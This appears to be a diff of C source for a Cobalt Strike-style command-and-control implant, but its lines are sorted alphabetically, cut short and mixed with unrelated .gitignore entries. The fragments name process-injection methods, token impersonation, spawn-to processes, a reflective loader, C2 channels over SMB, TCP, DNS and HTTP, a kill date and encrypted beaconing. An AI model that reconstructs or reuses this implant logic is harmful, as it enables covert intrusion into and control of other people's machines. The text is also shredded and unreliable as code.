+define METADATA_FLAG_X64_AGENT 2
+define METADATA_FLAG_X64_SYSTEM 4
+define METADATA_ID 0xBEEF
+define METHOD_CREATE_REMOTE_THREAD 3
+define METHOD_CREATE_REMOTE_THREAD_S 7
+define METHOD_CREATE_THREAD 1
+define METHOD_CREATE_THREAD_S 6
+define METHOD_NT_QUEUE_APC_THREAD 5
+define METHOD_NT_QUEUE_APC_THREAD_S 8
+define METHOD_RTL_CREATE_USER_THREAD 4
+define METHOD_SET_THREAD_CONTEXT 2
+define MULTI_RELOC 1028
+define PIVOT_HINT_FORWARD 0
+define PIVOT_HINT_PROTO_PIPE 0
+define PIVOT_HINT_PROTO_TCP 0x100000
+define PIVOT_HINT_REVERSE 0x10000
+define PROTOCOL_DNS 1
+define PROTOCOL_HTTP 0
+define PROTOCOL_HTTPS 8
+define PROTOCOL_SMB 2
+define PROTOCOL_TCP_BIND 16
+define PROTOCOL_TCP_REVERSE 4
+define PROXY_DIRECT 1
+define PROXY_MANUAL 0
+define PROXY_MANUAL_CREDS 4
+define PROXY_PRECONFIG 2
+define RDATA_SECTION_RELOC 1024
+define RECORD_CAPACITY_INCREMENT 25
+define REFLECTIVE_LOADER_SIZE 51200
+define RELOC64_REL32 4
+define RELOC_ADDR32 6
+define RELOC_REL32 20
+define RELOC_UNK_10 10
+define STEP_APPEND 0x1
+define STEP_BASE64 0x3
+define STEP_BASE64URL 0xD
+define STEP_BUILD 0x7
+define STEP_HEADER 0x6
+define STEP_MASK 0xF
+define STEP_NETBIOS 0x8
+define STEP_NETBIOSU 0xB
+define STEP_NONE 0x0
+define STEP_PARAMETER 0x5
+define STEP_PREPEND 0x2
+define STEP_PRINT 0x4
+define STEP_STRREP 0xE
+define STEP_URI_APPEND 0xC
+define STEP__HEADER 0xA
+define STEP__HOSTHEADER 0x10
+define STEP__PARAMETER 0x9
+define STRATEGY_DEFAULT 0
+define STRATEGY_FAILOVER 2
+define STRATEGY_RANDOM 1
+define STRLEN(s) ((int)((sizeof(s)/sizeof(s[0])) - 1))
+define TEB$ActivationContextStack() ((char
+define _CRT_SECURE_NO_WARNINGS
+define auto error
+dlldata.c
+do {
+download = DOWNLOAD_ENTRY{
+download->remainingData -= read
+download->remainingData = 0
+dst = gSpawnToX64
+dst = gSpawnToX86
+dwSize = size 
+ecf/
+elif S_DOMAIN_STRATEGY == STRATEGY_FAILOVER
+elif S_DOMAIN_STRATEGY == STRATEGY_RANDOM
+else
+else if (!CreateProcessAsUserA(
+else if (GetTickCount() - channel->creationTime > channel->timeoutPeriod)
+else if (maxGet != 0)
+else if (option == METHOD_CREATE_THREAD_S)
+else if(S_PROXY_BEHAVIOR == PROXY_DIRECT)
+else if(S_PROXY_BEHAVIOR == PROXY_PRECONFIG)
+else {
+endif
+entry->callback(entry->record.ptr)
+error:
+exceptfds)
+exceptfds))
+executable = position 
+execution->cmd = cmds.fullCmd
+execution->creationFlags 
+execution->processInfo))
+exit(1)
+extern BOOL gIdentityIsLoggedIn
+extern HANDLE gIdentityToken
+extern SESSION gSession
+extern WCHAR
+extern int gThreadsActive
+extern int osMajorVersion
+fclose(download->file)
+fclose(file)
+fd_set exceptfds
+fd_set readfds
+fd_set writefds
+fileSize = (int)fileSize
+filename = { 0 }
+findData)
+findData))
+findData.cFileName)
+flOldProtect))
+flags 
+flags = METADATA_FLAG_X64_AGENT 
+flush)(struct _PROTOCOL
+fnBeaconCleanupProcess)(PROCESS_INFORMATION
+fnBeaconDataExtract)(datap
+fnBeaconDataInt)(datap
+fnBeaconDataLength)(datap
+fnBeaconDataParse)(datap
+fnBeaconDataPtr)(datap
+fnBeaconDataShort)(datap
+fnBeaconErrorNA)(int type)
+fnBeaconFormatAlloc)(formatp
+fnBeaconFormatAppend)(formatp
+fnBeaconFormatFree)(formatp
+fnBeaconFormatInt)(formatp
+fnBeaconFormatPrintf)(formatp
+fnBeaconFormatReset)(formatp
+fnBeaconFormatToString)(formatp
+fnBeaconInjectTemporaryProcess)(PROCESS_INFORMATION
+fnBeaconIsAdmin)()
+fnBeaconRevertToken)()
+fnBeaconUseToken)(HANDLE token)
+fnFreeLibrary)(HMODULE hLibModule)
+fnGetModuleHandleA)(LPCSTR lpModuleName)
+fnLoadLibraryA)(LPCSTR lpLibFileName)
+fnToWideChar)(char
+for (ARGUMENT_ENTRY
+for (CHANNEL_ENTRY
+for (DOWNLOAD_ENTRY
+for (JOB_ENTRY
+for (char
+for (const ARGUMENT_ENTRY
+for (int i = 0
+for (int index = 0
+for (int step = BeaconDataInt(
+for (int total = 0
+for (totalRead = 0
+for(CHANNEL_ENTRY
+for(int attempts = 0
+for(int i = 0
+for(int i=0
+for(int total = 0
+for(totalRead = 0
+format)
+format->buffer 
+format->length 
+formatp format
+formatp locals
+free(api)
+free(buffer)
+free(channel)
+free(download)
+free(entry->record.ptr)
+free(expanded)
+free(filename)
+free(filepath)
+free(format->original)
+free(gCopiedDefaultDomains)
+free(gHeapRecords)
+free(gImportedPshScript)
+free(gRecords)
+free(job)
+free(lpFileName)
+free(lpFileNameInternal)
+free(lpPathName)
+free(newCmd)
+free(pAllocedData)
+free(parser)
+free(parser->original)
+free(path)
+free(webResponse)
+free(webResponse->content)
+free(webResponse->data)
+free(webResponse->header)
+gAesCipher = find_cipher(aes_desc.name)
+gArguments = argument
+gBlockDlls = BeaconDataInt(
+gChannelBuffer = malloc(CHANNEL_BUFFER_SIZE)
+gChannels = channel->next
+gChannels = newChannel
+gContext)
+gCopiedDefaultDomains = malloc(srcLength 
+gDownloadChunk = malloc(sizeof(DOWNLOAD_CHUNK))
+gDownloadChunk->fid = htonl(download->fid)
+gDownloads = download
+gDownloads = download->next
+gEncryptCbc) != CRYPT_OK)
+gFailoverAttempts
+gHashSha256 = find_hash(sha256_desc.name)
+gHeapRecords = malloc(sizeof(HEAP_RECORD) 
+gHeapRecords[heapCount
+gHeapRecords[heapCount] = (HEAP_RECORD) { 0 }
+gIdentityCredentialsParser = BeaconDataAlloc(2048)
+gIdentityIsLoggedIn = TRUE
+gIdentityToken = NULL
+gIdentityToken = hElevationToken
+gIdentityToken))
+gImportedPshScript = (char
+gImportedPshScript[size] = 0
+gInternetConnect = InternetConnectA(
+gInternetOpen = InternetOpenA(
+gIsHeapFiltering = FALSE
+gIsHeapFiltering = TRUE
+gIsHeapFiltering = gIsHeapFiltering 
+gJitter = jitter
+gJobs
+gJobs = newJob
+gLinks[i]
+gLinks[i].bid = 0
+gLinks[i].isOpen = FALSE
+gLinks[i].lastPingTime = 0
+gLinks[i].lastPingTime = now 
+gLinks[i].protocol
+gNetworkIsInit = TRUE
+gNetworkOptions 
+gNetworkOptions = INTERNET_FLAG_RELOAD 
+gParentPid = BeaconDataInt(
+gPostBufferLength = 0
+gRandomDomainsArray = copiedDomains
+gRandomTokenArray[gRandomTokenCount
+gRandomTokenCount = 0
+gRecordCapacity 
+gRecordCapacity = 0
+gRecordCount
+gRecordCount = 0
+gRecords = malloc(sizeof(RECORD_ENTRY) 
+gRecords[gRecordCount] = (RECORD_ENTRY) {
+gRecords[i]
+gRijndaelSymkey) != CRYPT_OK)
+gRouteAux = malloc(MAX_ROUTE_AUX)
+gRouteAux->bid = bid
+gSelectedRandomDomainIndex = -1
+gSession.bid = gBid = RandomEvenInt()
+gSession.length = 128
+gSession.length)
+gSleepTime = 0
+gSleepTime = BeaconDataInt(
+gThreadStartAddress = (LPTHREAD_START_ROUTINE)
+gThreadsActive
+goto callback_close
+goto cleanup
+goto close
+goto error
+goto waitAndClose
+hElevationToken = INVALID_HANDLE_VALUE
+hElevationToken))
+hPreelevationAuxThread = INVALID_HANDLE_VALUE
+hToken)
+hToken))
+hToken)) {
+headerSize)
+headers
+healthchecksdb
+heapCount
+heapCount = 0
+if (
+if ( dataSize < 0 
+if ( openLink->callbackData == NULL )
+if (!(TEB$ActivationContextStack()))
+if (!(interfaceInfo[i].iiFlags 
+if (!AllocateAndInitializeSid(
+if (!BeaconDataStringCopySafe(
+if (!CreateProcessA(
+if (!CreateProcessWithLogonW(
+if (!GetLastError())
+if (!IS_X64() 
+if (!ImpersonateLoggedOnUser(gIdentityToken))
+if (!ImpersonateLoggedOnUser(hElevationToken))
+if (!ImpersonateLoggedOnUser(hToken))
+if (!ImpersonateLoggedOnUser(token))
+if (!LinkAdd(
+if (!SetNamedPipeHandleState(
+if (!buffer)
+if (!channel->state)
+if (!closesocket((SOCKET)channel->socket) 
+if (!current)
+if (!current->isActive 
+if (!fnWow64DisableWow64FsRedirection)
+if (!fnWow64RevertWow64FsRedirection)
+if (!gBlockDlls
+if (!gIdentityToken 
+if (!gLinks[i].isOpen)
+if (!gRandomDomainsArray)
+if (!gRouteAux)
+if (!gThreadStartAddress)
+if (!hProcess 
+if (!hProcess)
+if (!hThread)
+if (!img)
+if (!injection->isProcessX64)
+if (!injection->isSameArchAsHostSystem)
+if (!injection->isSamePid)
+if (!injection->isTemporary 
+if (!injection->isTemporary)
+if (!job)
+if (!job->isDead)
+if (!job->isPipe)
+if (!lHostent)
+if (!lpTotalBytesAvail)
+if (!openLink)
+if (!pAlloc)
+if (!pAllocedData)
+if (!parentPid 
+if (!parser)
+if (!processAddress)
+if (!ptr)
+if (!read)
+if (!result) {
+if (!size)
+if (!substr)
+if (!target)
+if (!x86)
+if ((char
+if ((execution->creationFlags 
+if (BeaconDataLength(
+if (BeaconIsAdmin()) {
+if (CreateProcessWithTokenW(
+if (FilesystemIsDirectory(filepath))
+if (GetLastError() != ERROR_PIPE_BUSY)
+if (GetLastError() == ERROR_PIPE_BUSY)
+if (GetTickCount() - channel->lastActive > 1000)
+if (IS_X64() 
+if (S_CFG_CAUTION == TRUE)
+if (S_CFG_CAUTION == TRUE) {
+if (S_CFG_CAUTION) {
+if (S_HEADERS_REMOVE)
+if (S_PROCINJ_ALLOCATOR 
+if (S_PROCINJ_PERMS_I != S_PROCINJ_PERMS)
+if (S_PROCINJ_PERMS_I == S_PROCINJ_PERMS)
+if (S_PROXY_BEHAVIOR == PROXY_MANUAL_CREDS)
+if (WSAGetLastError() != WSAEWOULDBLOCK)
+if (_IsWow64Process == NULL)
+if (_NtMapViewOfSection == NULL)
+if (_NtQueueApcThread == NULL)
+if (_RtlCreateUserThread == NULL)
+if (aLen <= 0)
+if (acceptSocket == INVALID_SOCKET) {
+if (attributeList == NULL)
+if (available)
+if (bindResult == SOCKET_ERROR)
+if (bufferSize >= size)
+if (bytesAvailable == 0)
+if (cbc_done(
+if (ch->id == id)
+if (channel->lastActive != 0)
+if (channel->state 
+if (channel->state != CHANNEL_STATE_0 
+if (channel->state != CHANNEL_STATE_2)
+if (channel->state == CHANNEL_STATE_1 
+if (channel->type == CHANNEL_TYPE_BIND 
+if (channel->type == CHANNEL_TYPE_BIND)
+if (channel->type == CHANNEL_TYPE_CONNECT)
+if (channel->type == CHANNEL_TYPE_TCP_PIVOT)
+if (couldAdjust)
+if (count == 0)
+if (current->isActive 
+if (current->isActive)
+if (data.isExecuted)
+if (dataSize < 0 
+if (download->fid == fid)
+if (download->remainingData != 0)
+if (download->remainingData == 0)
+if (dwInternetStatus == INTERNET_STATUS_CONNECTED_TO_SERVER)
+if (file != INVALID_HANDLE_VALUE)
+if (file == INVALID_HANDLE_VALUE 
+if (fileSize == INVALID_FILE_SIZE)
+if (filenameSize == 0)
+if (findData.dwFileAttributes 
+if (flags)
+if (format->size - format->length >= len)
+if (fullPathSize > MAX_FILENAME)
+if (gBlockDlls)
+if (gCopiedDefaultDomains)
+if (gHeapRecords)
+if (gIdentityCredentialsParser) {
+if (gIdentityToken)
+if (gImportedPshScript)
+if (gLinks[i].bid != bid 
+if (gLinks[i].isOpen == TRUE 
+if (gLinks[i].isOpen)
+if (gLinks[i].lastPingTime >= GetTickCount())
+if (gNetworkIsInit)
+if (gRecords)
+if (gRecords[i].isHeap)
+if (gSelectedRandomDomainIndex < 0 
+if (gSpawnToX64 == NULL 
+if (gSpawnToX86 == NULL 
+if (gThreadStartAddress)
+if (hFileMapping != INVALID_HANDLE_VALUE)
+if (hFindFile == INVALID_HANDLE_VALUE)
+if (hPreelevationAuxThread != INVALID_HANDLE_VALUE)
+if (hPrenamedPipe)
+if (hProcess == NULL)
+if (hProcess) {
+if (hSnapshot == INVALID_HANDLE_VALUE 
+if (hThread == NULL)
+if (hToken)
+if (host == NULL)
+if (ignoreToken)
+if (injection->isSamePid 
+if (injection->isSamePid)
+if (injection.isSameArchAsHostSystem)
+if (inlen % 2 == 1) return 0
+if (isDirectory)
+if (isPending > 0) {
+if (isProcessX64)
+if (jitter >= 100)
+if (job)
+if (job->id == id)
+if (job->isDead)
+if (lastError == ERROR_INVALID_PARAMETER
+if (lastError == ERROR_PRIVILEGE_NOT_HELD
+if (lastError == ERROR_PRIVILEGE_NOT_HELD 
+if (lastError == ERROR_SEM_TIMEOUT)
+if (len == 0)
+if (length != sizeof(pid))
+if (length == 0)
+if (length > MAX_NAME)
+if (length > sizeof(path))
+if (length >= MAX_CMD)
+if (listenResult == SOCKET_ERROR)
+if (lpApcContext 
+if (lpBaseAddress == NULL)
+if (lpBaseAddress == NULL) {
+if (lpFileMap)
+if (nSize == 0 
+if (openLink->callbackData == NULL)
+if (option == METHOD_CREATE_REMOTE_THREAD_S)
+if (outres > outlen)
+if (pData->isExecuted)
+if (pInfo->hProcess)
+if (pInfo->hThread)
+if (pLen >= REFLECTIVE_LOADER_SIZE 
+if (parentPid)
+if (parser->length < size)
+if (parser->length < sizeof(char))
+if (parser->length < sizeof(int))
+if (parser->length < sizeof(short))
+if (parser->length == 0)
+if (position != NULL 
+if (potentialFuncLocation == NULL 
+if (potentialFuncLocation == NULL)
+if (prependSize 
+if (prev == NULL)
+if (prev)
+if (raw_inlen > outlen)
+if (read < 0)
+if (read <= 0)
+if (read == 0)
+if (read == SOCKET_ERROR)
+if (received == SOCKET_ERROR)
+if (recoverableLength <= 0)
+if (recoverableLength == 0)
+if (remaining < 0) // this should never happen
+if (result)
+if (sb.size == 0)
+if (sent != SOCKET_ERROR)
+if (si->hStdError)
+if (si->hStdOutput 
+if (si->hStdOutput)
+if (size == 0)
+if (size > dwSize)
+if (size)
+if (sock != INVALID_SOCKET)
+if (sock == INVALID_SOCKET)
+if (socket == INVALID_HANDLE_VALUE)
+if (socket == INVALID_SOCKET)
+if (te32.th32OwnerProcessID != injection->pid)
+if (temp == NULL)
+if (toolhelp == INVALID_HANDLE_VALUE) {
+if (totalHeaderRead == -1 
+if (totalRead != length)
+if (totalReceived == SOCKET_ERROR)
+if (totalReceived == size)
+if (transformedLength == 0)
+if (waitTime)
+if (x86)
+if IS_X64()
+if S_DOMAIN_STRATEGY == STRATEGY_DEFAULT
+if _WIN64
+if(!BeaconDataStringCopySafe(
+if(!IsProcess64Bit(processInfo->hProcess))
+if(!gChannelBuffer)
+if(!gChannels)
+if(!gImportedPshScript)
+if(!gPostBufferLength)
+if(!gSpawnToX86 
+if(!received)
+if(GetLastError() == ERROR_BAD_NETPATH 
+if(ImpersonateNamedPipeClient(hPrenamedPipe))
+if(NetworkCheckResponse(hInternet) 
+if(NetworkCheckResponse(hRequest))
+if(S_EXIT_FUNK == TRUE)
+if(S_KILLDATE)
+if(S_PROTOCOL 
+if(S_PROXY_BEHAVIOR == PROXY_MANUAL 
+if(channel->state != CHANNEL_STATE_0 
+if(channel->state != CHANNEL_STATE_1)
+if(disableWow64FsRedirection)
+if(entry->allocType == ALLOC_TYPE_MALLOC)
+if(entry->callback)
+if(firstFile == INVALID_HANDLE_VALUE)
+if(gDownloadChunk)
+if(gHeapRecords)
+if(gIdentityDomain)
+if(gIsHeapFiltering == FALSE 
+if(gParentPid 
+if(gRecordCount 
+if(gRecords)
+if(hElevationToken == INVALID_HANDLE_VALUE)
+if(hPrenamedPipe)
+if(ioctlresult == SOCKET_ERROR)
+if(isThereHostHeader 
+if(lastError == ERROR_ACCESS_DENIED)
+if(len <= 0)
+if(length != 0 
+if(length == 0)
+if(lpCurrentFindFileData->dwFileAttributes 
+if(lpFileName == NULL)
+if(param > recoverableLength)
+if(read != 0)
+if(read <= 0)
+if(received > 0)
+if(rsa_import((unsigned char
+if(shouldCreateInternetOpen)
+if(sock == INVALID_SOCKET)
+if(strlen(transform.uriParams))
+if(targetSocket != INVALID_SOCKET)
+if(totalRead >= size)
+if(x >= 0 
+if(x86 == isProcessX64)
+if(x86)
+ifdef _DEBUG
+include <DbgHelp.h>
+include <stdbool.h>
+include <stdio.h>
+include <stdlib.h>
+include <tchar.h>
+include <time.h>
+include <tlhelp32.h>
+include <windows.h>
+include <wininet.h>
+include <winsock2.h>
+include <winternl.h>
+include <ws2ipdef.h>
+index)
+injection.isProcessX64 = IsProcess64Bit(hProcess)
+injection.isSameArchAsHostSystem = injection.isProcessX64 == IS_X64()
+injection.isSamePid = pid == GetCurrentProcessId()
+injection.isTemporary = processInfo != NULL
+injection.isX64 = IS_X64()
+injection.pid = pid
+injection.process = hProcess
+injection.thread = injection.isTemporary 
+int     BeaconDataInt(datap 
+int     BeaconDataLength(datap 
+int     BeaconDataStringCopy(datap
+int     BeaconDataStringCopySafe(datap 
+int     BeaconFormatLength(formatp
+int    length
+int    size
+int (
+int BeaconDataInt(datap
+int BeaconDataLength(datap
+int BeaconDataStringCopy(datap
+int BeaconDataStringCopySafe(datap
+int BeaconFormatLength(formatp
+int ChannelReceiveData()
+int CryptoAesHmacEncrypt(char
+int NetworkGet(const char
+int ProtocolSmbRead(PROTOCOL
+int ProtocolTcpRead(PROTOCOL
+int RandomEvenInt(void)
+int RandomInt(void)
+int RoundToNearestEven(int value)
+int StagePayloadViaTcp(char
+int TransformDecode(char
+int XorMask(const char
+int XorUnmask(const char
+int afterLength = strlen(after)
+int allocType
+int appendSize = BeaconDataInt(
+int argp = 1
+int argumentLength = BeaconDataInt(
+int attempts = 0
+int baseLen = BeaconDataLength(
+int bid
+int bid = BeaconDataInt(
+int buffer
+int bufferSize = BeaconDataLength(
+int bufferSize = parser->length 
+int bytesRead = 0
+int callbackLength
+int cbLength = BeaconDataLength(
+int cbLength = BeaconFormatLength(
+int channelId = 0
+int channelId = BeaconDataInt(
+int cmd = BeaconDataInt(
+int cmdLength
+int codeLength = codePair.size
+int contentLength
+int contentLength = BeaconDataLength(
+int creationFlags
+int creationTime
+int currentPid = GetCurrentProcessId()
+int currentSessionId
+int data = ntohl(
+int dataArgument = BeaconDataInt(
+int dataLength = BeaconDataLength(
+int dataSize = 
+int descriptionLength = BeaconDataStringCopySafe(
+int dwSize = S_PROCINJ_MINALLOC
+int entryPoint = BeaconDataInt(
+int error = GetLastError()
+int failSeconds
+int failX
+int fid
+int fid = BeaconDataInt(
+int filenameSize = BeaconDataStringCopySafe(
+int gAesCipher
+int gBid
+int gChannelIdCount = 0
+int gDownloadFid = 0
+int gHashSha256
+int gJitter
+int gParentPid
+int gPostBufferLength = 0
+int gSleepTime
+int gThreadsActive = 0
+int headerLength
+int headerSize
+int heapCount
+int i = 0
+int id
+int id = BeaconDataInt(
+int id = htonl(download->fid)
+int isPending = BeaconDataInt(
+int jitter = BeaconDataInt(
+int lastActive
+int lastError
+int lastError = GetLastError()
+int lastPingTime
+int len = BeaconDataLength(
+int len = baseLen
+int length
+int length = sizeof(buffer)
+int logicalDrives = GetLogicalDrives()
+int millis = BeaconDataInt(
+int mode = PIPE_READMODE_MESSAGE
+int newId = ChannelGetId()
+int numInterfaces = 0
+int numProcessedChannels = 0
+int osMajorVersion
+int out
+int outlen = 16
+int packedLength = BeaconDataLength(
+int param
+int paramLength
+int payloadLength = BeaconDataLength(
+int payloadOffset = BeaconDataInt(
+int pcbBuffer = MAX_USER_NAME
+int pid
+int pid = BeaconDataInt(
+int pid32
+int pid32 = BeaconDataInt(
+int port
+int port = 445
+int port = BeaconDataInt(
+int prependSize = BeaconDataInt(
+int prng_idx = find_prng(sprng_desc.name)
+int read
+int reflectiveLoaderOffset = BeaconDataInt(
+int remaining
+int remaining = BeaconDataLength(
+int remainingData
+int reqno = BeaconDataInt(
+int result = -1
+int seconds
+int seconds = 0
+int sessionId
+int size
+int size = 0
+int size = BeaconDataInt(
+int size = BeaconDataInt(parser)
+int size = BeaconDataLength(
+int size = BeaconFormatLength(
+int state
+int tickCount = GetTickCount()
+int timeout = 240000
+int timeout = GetTickCount() 
+int timeoutPeriod
+int tmp = dataLength
+int toWrite = dataLength - total
+int total = 0
+int totalBytesRead = 0
+int totalRead = 0
+int transformedLength = 0
+int type
+int value = BeaconDataInt(
+int wrote = 0
+ipch/
+isAdmin)) {
+isHostHeaderStepDone = isThereHostHeader
+isWow64 
+issue-259490424)
+issuecomment-104372622)
+jitter = 0
+job = job->next
+job->callbackType = CALLBACK_OUTPUT
+job->callbackType = CALLBACK_OUTPUT_OEM
+job->callbackType = callbackType
+job->hRead = hRead
+job->hWrite = INVALID_HANDLE_VALUE
+job->hWrite = hWrite
+job->isDead = TRUE
+job->isMsgMode = FALSE
+job->isMsgMode = isMsgMode
+job->isPipe = FALSE
+job->isPipe = TRUE
+job->next
+job->next = NULL
+job->next = newJob
+job->pid = pi->dwProcessId
+job->pid32 = pi->dwProcessId
+job->pid32 = pid32
+job->process = pi->hProcess
+job->thread = pi->hThread
+jpeg
+kernel32$Wow64DisableWow64FsRedirection(
+kernel32$Wow64RevertWow64FsRedirection(oldValue)
+key) != CRYPT_OK)
+key))
+lTimeval)
+lastError = GetLastError()
+len = 0
+len = baseLen
+length 
+length = BeaconDataLength(
+length)
+libtomcrypt
+localTime)
+locals)
+locals))
+long long ChannelGetId()
+long long fileSize = _ftelli64(file)
+long long gRecordCapacity = 0
+long long gRecordCount = 0
+long maskLen = sizeof(mask)
+long r_vaddr
+long time = now.wDay 
+lpApcContext = NULL
+lpCurrentDirectory = buffer
+lpCurrentFindFileData = findData
+lpFileName = malloc(MAX_FILENAME)
+lpModuleName = BeaconDataStringPointer(
+lpProcName = BeaconDataStringPointer(
+lpProcessInfo = { 0 }
+lpProcessInfo))
+ltc_mp = ltm_desc
+maskLen) != CRYPT_OK)
+maskedPayload->keyPtrMagic = 0xF00D
+maskedPayload->pGetProcAddress = GetProcAddress
+maskedPayload->pLoadLibraryA = LoadLibraryA
+maskedPayload->pVirtualAlloc = VirtualAlloc
+maskedPayload->pVirtualProtect = VirtualProtect
+memcpy(
+memcpy(substr 
+memcpy(transform->temp 
+memcpy(transform->transformed 
+memset(
+mfcribbon-ms</Extensions>
+mono_crash.
+nCrunchTemp_
+name[end] = 0
+newChannel = (CHANNEL_ENTRY){
+newJob->id = gJobCurrentId
+node_modules/
+notClosed:
+now)
+numInterfaces = bytesReturned / sizeof(INTERFACE_INFO)
+numProcessedChannels
+nunit-
+oldValue)
+openLink = 
+openLink->bid = bid
+openLink->callbackData = malloc(MAX_CALLBACK_DATA)
+openLink->callbackLength = BeaconDataLength(
+openLink->isOpen = TRUE
+openLink->protocol = 
+ordinal = BeaconDataShort(
+orleans.codegen.cs
+osMajorVersion = osVersionInfo->dwMajorVersion
+osVersionInfo->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA)
+out[i 
+out[i] = (char)((in[j] - nb) << 4) 
+out[i] = in[i 
+out[j 
+out[j] = (char)(in[i] >> 4 
+outlen = maxGet
+outlen = transform->outputLength
+outlen)
+outlen) != CRYPT_OK)
+pAllocedData = data
+pData->isExecuted = TRUE
+pHeaderLength - sizeof(int)) = headerSize
+pHeaderLength = headerLength
+pLen = BeaconFormatLength(
+pNext = 
+pNext = job->next
+pNext)
+pOffset 
+pPacketSize = ntohl(format.length - (2 
+pThreadInfo = (THREAD_INFO){
+paket-files/
+param = BeaconDataInt(
+paramLength = BeaconDataStringCopySafe(
+paramLength = strlen(param)
+parameter = 0
+parameter = InjectRemotely(
+parentContext)
+parentContext.cleanup(
+parser)
+parser) != 0
+parser))
+parser->buffer 
+parser->length -= size
+parser->length -= sizeof(char)
+parser->length -= sizeof(int)
+parser->length -= sizeof(short)
+path[length] = '
+payload = BeaconFormatOriginal(
+pcbBuffer = MAX_COMPUTER_NAME
+pcbBuffer)
+pe))
+pe)) {
+pe.th32ProcessID)
+pi))
+pid = BeaconDataInt(
+pipe != INVALID_HANDLE_VALUE)
+pipe)
+port = htons(port)
+potentialFuncLocation = currentFunction
+potentialFuncLocation = newFunction
+pragma code_seg(pop)
+pragma once
+prev = channel
+prev = download
+prev = job
+prev->next
+prev->next = channel->next
+prev->next = download->next
+priorSleepTime
+priorSleepTime = 
+priorSleepTime = 0
+priorSleepTime)
+project.fragment.lock.json
+project.lock.json
+protocol
+protocol->channel.handle = handle
+protocol->channel.socket = socket
+protocol->close = ProtocolSmbClose
+protocol->close = ProtocolTcpClose
+protocol->flush = NULL
+protocol->flush = ProtocolSmbFlush
+protocol->read = ProtocolSmbRead
+protocol->read = ProtocolTcpRead
+protocol->waitForData = ProtocolSmbWaitForData
+protocol->waitForData = ProtocolTcpWaitForData
+protocol->write = ProtocolSmbWrite
+protocol->write = ProtocolTcpWrite
+proxy = NULL
+proxy = S_PROXY_CONFIG
+publish/
+putenv(buffer)
+rcf/
+rdataPair)
+read = -1
+read)
+read) 
+read)(struct _PROTOCOL
+readfds)
+readfds))
+recoverableLength -= param
+recoverableLength = FromNetbios(
+recoverableLength = outlen
+recoverable[recoverableLength] = 0
+register_cipher(
+register_hash(
+register_prng(
+relocationsPair)
+relocationsParser)
+remaining = BeaconDataLength(
+result = 0
+result = FALSE
+result = RunProcessWithAdjustedCmd(runUnderConfig)
+result = TRUE
+resx
+return
+return !IsWow64ProcessEx(hProcess)
+return (char
+return -1
+return 0
+return 0x4000000 
+return BeaconDataOriginal(format)
+return CloseHandle(hProcess)
+return FALSE
+return GetFileAttributesA(filename) 
+return INVALID_HANDLE_VALUE
+return INVALID_SOCKET
+return JobAdd(job)
+return NULL
+return ResumeThread(hThread) != -1
+return ResumeThread(injection->thread) != -1
+return RoundToNearestEven(RandomInt())
+return RunProcessWithAdjustedCmd(runUnderConfig)
+return RunUnder_(
+return SOCKET_ERROR
+return SpawnProcess(execution)
+return SpawnProcessWithTokenOrLogon(execution)
+return TRUE
+return argument
+return atoi(status) == HTTP_STATUS_OK
+return attributeList
+return buffer
+return bufferSize
+return closesocket(targetSocket)
+return context
+return current
+return currentFunction
+return data
+return fnWow64DisableWow64FsRedirection(OldValue)
+return fnWow64RevertWow64FsRedirection(OldValue)
+return format->buffer
+return format->length
+return format->original
+return gHeapRecords
+return gImportedPshScript
+return gRandomTokenArray[0]
+return gRandomTokenArray[gSelectedRandomDomainIndex]
+return hThread != NULL
+return header
+return i
+return inlen / 2
+return interfaceInfo[i].iiAddress.AddressIn.sin_addr.s_addr
+return isAdmin
+return j
+return job
+return length 
+return min 
+return numProcessedChannels
+return osMajorVersion >= (_WIN32_WINNT_VISTA >> 8)
+return out
+return outres
+return pAlloc
+return parser
+return parser->buffer
+return parser->length
+return parser->original
+return potentialFuncLocation
+return protocol
+return raw_inlen
+return recoverableLength
+return result
+return sb->buffer
+return sb.buffer
+return sessionId == currentSessionId
+return sock
+return time >= S_KILLDATE
+return total
+return totalRead
+return value - value % multiple
+return webResponse
+returnLength))
+rng_get_bytes((unsigned char
+rsa_key key
+runUnderConfig->creationFlags 
+runUnderConfig->processInfo))
+runUnderConfig->startupInfo
+runUnderConfig->startupInfo = 
+runUnderConfig->startupInfo))
+runUnderConfig->startupInfo->lpDesktop = 0
+seconds >= 10)
+service.sin_addr.s_addr = LOCALHOST
+service.sin_family = AF_INET
+service.sin_port = htons(port)
+sessionId))
+settings.h
+sha256_desc)
+short   BeaconDataShort(datap 
+short (
+short BeaconDataShort(datap
+short acp = GetACP()
+short callbackType = BeaconDataShort(
+short data = ntohs(
+short id = BeaconDataShort(
+short numPrivileges = BeaconDataShort(
+short oemcp = GetOEMCP()
+short port = BeaconDataShort(
+short waitTime = BeaconDataShort(
+shouldCreateInternetOpen = FALSE
+si->hStdError = si->hStdOutput
+si.dwFlags = STARTF_USESHOWWINDOW 
+si.dwFlags = STARTF_USESTDHANDLES 
+si.hStdError = 0
+si.hStdError = hWrite
+si.hStdInput = 0
+si.hStdInput = NULL
+si.hStdOutput = 0
+si.hStdOutput = hWrite
+si.lpDesktop = NULL
+si.wShowWindow = SW_HIDE
+si_.StartupInfo = 
+si_.StartupInfo.cb = sizeof(STARTUPINFOEXA)
+si_.lpAttributeList = lpAttributeList
+sid = -1
+sid)
+sid))
+sid)) {
+size 
+size = BeaconDataLength(format)
+size = MAX_SPAWN_TO_X64
+size = MAX_SPAWN_TO_X86
+size = sb.size
+size)
+size))
+size_t BeaconDataStoreMaxEntries()
+size_t end = length
+size_t length
+size_t size
+sizedbuf bytesPair
+sizedbuf codePair
+sizedbuf dataPair
+sizedbuf rdataPair
+sizedbuf relocationsPair
+sizedbuf sb
+sleepTime
+sleepTime = 
+sleepTime = min(
+sockaddr.sin_addr.s_addr = addr
+sockaddr.sin_family = AF_INET
+sockaddr.sin_port = htons(port)
+spawnTo = S_SPAWNTO_X64
+spawnTo = S_SPAWNTO_X86
+sprng_desc)
+srand(tickCount 
+static DOWNLOAD_CHUNK
+static DWORD gJobCurrentId = 0
+static char
+static const int MAX_BUFFER = 0x100
+static int gRandomTokenCount
+static int gSelectedRandomDomainIndex
+step == STEP_NETBIOSU 
+struct CHANNEL_ENTRY
+struct DOWNLOAD_ENTRY
+struct _ARGUMENT_ENTRY
+struct _JOB_ENTRY
+struct bapi
+struct hostent
+struct sockaddr_in addr
+struct sockaddr_in service
+struct sockaddr_in sockaddr
+switch (cmd)
+switch (dataArgument)
+switch (method)
+switch (step)
+switch(step)
+symmetric_CBC gEncryptCbc
+symmetric_key gRijndaelSymkey
+systemTime)
+t%02d/%02d/%02d %02d:%02d:%02d
